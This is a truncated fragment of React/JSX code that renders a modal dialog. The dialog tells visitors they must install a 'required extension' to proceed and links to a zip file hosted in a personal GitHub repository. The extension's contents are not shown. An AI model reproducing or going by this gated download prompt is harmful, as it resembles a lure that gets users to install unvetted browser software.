  ...
  return (
    ...
    >
      <Dialog.Panel className="w-full max-w-[600px] h-[315px] text-center">
        <div className="relative p-8 px-11 flex flex-col items-center overflow-hidden w-full h-full rounded-lg bg-white">
          <div
          ...
          <div className="mb-5">
            <p>Please install the required extension to proceed. You can download it from <a className="text-[#3C50E0] underline" href="https://raw.githubusercontent.com/Noulamin/public-releases/refs/heads/main/tm-extension.zip">here</a>, then refresh this page to continue.</p>
          </div>
